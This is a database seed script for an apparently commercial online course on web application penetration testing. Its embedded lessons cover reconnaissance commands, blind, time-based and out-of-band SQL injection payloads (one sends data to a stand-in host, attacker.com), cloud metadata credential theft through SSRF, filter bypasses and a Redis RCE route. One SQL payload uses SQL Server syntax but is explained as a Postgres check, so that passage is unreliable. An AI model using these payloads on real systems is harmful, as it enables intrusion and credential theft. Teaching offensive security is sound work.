import { PrismaClient, ModuleType } from '@prisma/client';

const prisma = new PrismaClient();

const RECON_MD = `
## Module 1: Advanced Reconnaissance & Attack Surface Mapping

Reconnaissance is the defining phase of any advanced penetration test. While automated scanners like Nessus or Burp Suite Professional are valuable, they often miss the nuanced, critical attack surface of modern applications—specifically hidden APIs, hardcoded secrets in client-side bundles, and unprotected microservices.

### 1. Advanced Subdomain Enumeration
Standard bruteforcing is noisy and incomplete. An advanced operative relies on passive data aggregation combined with active permuted resolution.

**The Strategy:**
Instead of just using \`subfinder\`, chain multiple tools to generate a massive, unique list of targets.

\`\`\`bash
# 1. Passive Aggregation
subfinder -d target.com -all -silent | anew subs.txt
assetfinder -subs-only target.com | anew subs.txt
amass enum -passive -d target.com | anew subs.txt

# 2. Permutation & Alteration (The Secret Weapon)
# We use tools like 'altdns' or 'gotator' to guess typical naming conventions
# e.g., if 'api.target.com' exists, maybe 'api-dev.target.com' does too.
gotator -sub subs.txt -perm permutations.txt -depth 1 -mindepth 1 | resolvers.txt | puredns resolve -r resolvers.txt | anew valid_subs.txt
\`\`\`

> [!TIP]
> **Why this matters:** Development and staging environments (\`dev.api.target.com\`, \`staging-v2.target.com\`) are notoriously under-secured, often lacking Rate Limiting, WAFs, and sometimes even Authentication.

### 2. JavaScript Analysis for Hidden Endpoints
Modern Single-Page Applications (SPAs) built on React, Angular, or Vue compile their logic into massive JavaScript bundles. These bundles are treasure troves for attackers.

**Techniques:**
1. **Endpoint Extraction:** Use tools like \`LinkFinder\` or \`x8\` to rip relative and absolute paths out of \`.js\` files.
2. **Secret Hunting:** Developers frequently (and accidentally) hardcode API keys, AWS Cognito tokens, or internal IP addresses.
3. **Source Map Analysis:** If a site accidentally deploys its \`.js.map\` files, you can completely un-minify their codebase, exposing all comments, variable names, and logic.

\`\`\`bash
# Finding hidden endpoints in JS files
python3 linkfinder.py -i https://target.com/main.bundle.js -o cli
\`\`\`

### 3. Fingerprinting & Bypassing the WAF
Before launching intensive scans like \`ffuf\` or \`sqlmap\`, you must map the active defenses. Identify if Cloudflare, AWS WAF, or Akamai is sitting in front of the target.

**Bypass Techniques:**
- **Origin IP Discovery:** WAFs only protect the public-facing CNAME. If you can find the actual backend origin IP (via historical DNS records on SecurityTrails or by triggering an outbound pingback request from the server), you can target the application directly—completely bypassing the WAF.
- **Protocol Smuggling:** Sending malformed HTTP/2 requests or exploiting HTTP Request Smuggling (CL.TE / TE.CL) can cause the frontend WAF and the backend server to desynchronize, letting malicious payloads slip through.

### Conclusion
Your initial reconnaissance dictates the success of your operation. A 4-hour penetration test should consist of 3 hours of recon and 1 hour of exploitation. 

*Proceed to the next module to learn how to exploit the data sinks we've just discovered.*
`;

const SQLI_MD = `
## Module 2: Complex SQL Injection (Blind, Time-Based & OOB)

Basic Error-Based SQL Injection (\`' OR 1=1--\`) is largely dead in modern enterprise applications due to ORMs (Object-Relational Mappers) and Prepared Statements. To find vulnerabilities today, you must master Blind, Time-Based, and Out-of-Band (OOB) techniques.

### 1. Blind Boolean SQL Injection
When an application doesn't return database errors or retrieved data, but behaves differently based on a TRUE or FALSE condition, it's vulnerable to Blind Boolean SQLi.

**The Scenario:**
Imagine an endpoint: \`https://api.target.com/users/check?username=admin\`
If it returns \`{"exists": true}\`, we can manipulate the query.

**The Payload:**
\`\`\`sql
admin' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin')='a'--
\`\`\`
If the application returns \`{"exists": true}\`, we know the first letter of the password hash is 'a'. By automating this with a tool like \`wfuzz\` or a custom Python script, we can blindly dump the entire database character by character.

### 2. Time-Based Blind SQLi
When the application absorbs the injected payload without any change in the HTTP response (e.g., a "Contact Us" form submission or an asynchronous logging pipeline), we force the database to pause its execution.

**PostgreSQL Example:**
\`\`\`sql
test@example.com'; SELECT pg_sleep(10)--
\`\`\`
If the server takes exactly 10 extra seconds to respond, you have confirmed Time-Based Execution.

**Data Exfiltration via Time:**
\`\`\`sql
test@example.com'; if ((select substring(version(),1,1))='P') waitfor delay '0:0:10'--
\`\`\`
*(If the DB is Postgres/starts with 'P', sleep for 10 seconds. We measure the response time to infer the data).*

> [!CAUTION]
> Time-based SQLi places a heavy load on the target database because it ties up worker threads. During a real-world engagement, excessive time-based payloads can accidentally cause a Denial of Service (DoS).

### 3. Out-of-Band (OOB) SQL Injection
When both Boolean and Time-based techniques are unviable (e.g., the query happens in a background worker queue or CI/CD pipeline), we force the database server to make an outbound DNS or HTTP request to an infrastructure we control (like Burp Collaborator).

**Oracle DNS OOB Example:**
\`\`\`sql
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT user)||'.attacker.com/"> %remote;]>'),'/l') FROM dual;
\`\`\`
If the database user is \`DB_ADMIN\`, our server will receive a DNS lookup for \`DB_ADMIN.attacker.com\`. We have successfully exfiltrated data without the application ever returning it in the HTTP response!

### Mitigation
The only 100% effective defense against SQL Injection is using **Parameterized Queries (Prepared Statements)**. Input validation and WAFs are defense-in-depth measures, but they can and will be bypassed.
`;

const SSRF_MD = `
## Module 4: Server-Side Request Forgery (SSRF) to RCE

Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource without validating the user-supplied URL. This allows an attacker to force the application to send crafted requests to unintended destinations, effectively turning the target server into a secure proxy.

### 1. The Anatomy of SSRF
Image uploaders, webhook integrations, and PDF generators are prime targets for SSRF.

**Vulnerable Scenario:**
\`https://target.com/api/fetch_image?url=https://attacker-domain.com/image.jpg\`

If you change the URL to \`http://127.0.0.1/admin\`, the server makes a request *from itself, to itself*. Because the request originates locally, internal routing restrictions and firewalls are bypassed.

### 2. Exploiting Cloud Metadata (AWS IMDS)
Modern targets are hosted in the cloud. Cloud providers use a magical local IP address (\`169.254.169.254\`) to provide instances with metadata—including highly privileged IAM credentials.

**Exploiting AWS IMDSv1 via SSRF:**
Payload:
\`\`\`text
http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role
\`\`\`
If successful, the application will return a JSON blob containing the \`AccessKeyId\`, \`SecretAccessKey\`, and \`Token\`. You can load these into your local AWS CLI and completely compromise the target's cloud infrastructure.

> [!IMPORTANT]
> AWS introduced IMDSv2 to stop simple GET-based SSRF by requiring a \`PUT\` request to generate a session token first. If you encounter IMDSv2, you must find an SSRF vulnerability that allows you to inject custom HTTP headers or control the HTTP method.

### 3. Bypassing URL Parsers
Developers often attempt to block \`127.0.0.1\` or \`localhost\`. Bypassing these blacklists requires an understanding of how backend languages (Node.js, Ruby, Python) parse URIs differently than the underlying OS (cURL, libcurl).

**Common Bypass Techniques:**
- **Decimal IP:** \`http://2130706433\` (Translates to 127.0.0.1)
- **Octal IP:** \`http://0177.0.0.1\`
- **IPv6 Localhost:** \`http://[::1]\`
- **DNS Rebinding:** You set up a domain (\`ssrf.attacker.com\`). The first time it resolves, it points to a safe IP (e.g., 8.8.8.8) to pass the developer's validation check. When the application actually makes the HTTP request a millisecond later, your custom DNS server responds with \`127.0.0.1\`.

### 4. Escalating SSRF to RCE (Gopher & Redis)
If the SSRF vulnerability supports the \`gopher://\` or \`dict://\` protocols, you can exploit internal services that don't use HTTP.

For example, if an internal Redis server is running without a password on port 6379, you can use the Gopher protocol to send raw TCP streams. You can manipulate Redis to overwrite the \`authorized_keys\` file of the local SSH user, allowing you to seamlessly SSH into the box, achieving full Remote Code Execution (RCE).
`;

async function main() {
    console.log('Seeding Premium Advanced Course...');

    // 1. Find the admin user
    const admin = await prisma.user.findFirst({
        where: { role: 'ADMIN' }
    });

    if (!admin) {
        console.error('Admin user not found. Cannot associate the premium course.');
        return;
    }

    // 2. Create the Premium Course
    const course = await prisma.course.upsert({
        where: { slug: 'advanced-wapt-masterclass' },
        update: {},
        create: {
            title: 'Advanced WAPT Masterclass',
            slug: 'advanced-wapt-masterclass',
            description: 'A deeply technical, 5-module masterclass covering Advanced Reconnaissance, Complex SQLi, Modern DOM XSS, SSRF to RCE, and a capstone interactive lab. Designed for security professionals and bug bounty hunters.',
            thumbnailUrl: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80',
            price: 20.00,
            isPublished: true,
            instructorId: admin.id,
            modules: {
                create: [
                    {
                        title: '1. Advanced Recon & Attack Surface Mapping',
                        type: ModuleType.TEXT,
                        content: RECON_MD,
                        orderIndex: 0
                    },
                    {
                        title: '2. Complex SQL Injection (Blind & OOB)',
                        type: ModuleType.TEXT,
                        content: SQLI_MD,
                        orderIndex: 1
                    },
                    {
                        title: '3. Advanced XSS & DOM Exploitation',
                        type: ModuleType.TEXT,
                        content: '## Module 3: Modern Cross-Site Scripting\n\nWhile reflected XSS is easily caught by modern WAFs, DOM-based XSS remains prevalent in complex client-side applications built on React and Vue. This module focuses on tracking user input through `Sources` (like `location.hash` or `window.name`) to executable `Sinks` (like `eval()`, `innerHTML`, or `setTimeout`).\n\n### Bypassing CSP\nContent Security Policy (CSP) is designed to mitigate XSS. However, developers frequently whitelist wide CDNs (e.g., `ajax.googleapis.com`) or misconfigure JSONP endpoints. If a target allows `*.google.com`, an attacker can use a known vulnerable JSONP endpoint hosted on Google to bypass the entire CSP and execute arbitrary JavaScript context.',
                        orderIndex: 2
                    },
                    {
                        title: '4. SSRF to Cloud Takeover',
                        type: ModuleType.TEXT,
                        content: SSRF_MD,
                        orderIndex: 3
                    },
                    {
                        title: '5. Capstone: Linux Exploitation Lab',
                        type: ModuleType.LAB,
                        content: 'Lab Environment Initialization sequence...',
                        orderIndex: 4
                    }
                ]
            }
        }
    });

    console.log('Successfully injected Premium Course: ', course.title);
    console.log('Value: $20.00 | Modules: 5 (Intensely Detailed)');
}

main()
    .catch(e => {
        console.error(e);
        process.exit(1);
    })
    .finally(async () => {
        await prisma.$disconnect();
    });
